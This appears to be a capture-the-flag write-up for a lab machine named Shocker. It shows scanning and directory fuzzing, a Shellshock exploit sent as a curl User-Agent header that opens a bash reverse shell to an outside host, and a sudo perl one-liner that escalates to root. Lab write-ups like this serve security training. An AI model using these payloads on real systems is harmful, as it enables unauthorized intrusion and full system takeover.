Started with a standard nmap scan:

```
sudo nmap -sV 10.129.79.178
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```

Browsing to `http://10.129.79.178` reveals nothing interesting; let's try fuzzing directories:

```
gobuster dir -u http://10.129.79.178/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50
gobuster dir -u http://10.129.79.178/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50
```

Further enumeration reveals this path:

```
http://10.129.79.178/cgi-bin/user.sh
```

This entry is commonly related to a well-known exploit called Shellshock; let's test if it's vulnerable:

```
nmap -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.79.178
```

```
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685
```

The payload abuses Bash's Shellshock bug by injecting a fake function definition (`() { :; };`) into the `User-Agent` header, which Apache passes to the CGI script as an environment variable; everything after the closing `}` is executed by the vulnerable Bash, triggering a reverse shell back to the attacker.

Let's start a listener:

```
nc -lnvp 4444
```

and send this payload:

```
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.194/4444 0>&1'" http://10.129.79.178/cgi-bin/user.sh
```

We receive a shell as `shelly`.

We find the user flag in `/home/shelly`.

`sudo -l` reveals the following results:

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can use perl to spawn a root shell in this way:

```
sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

We find `root.txt` in the root directory.
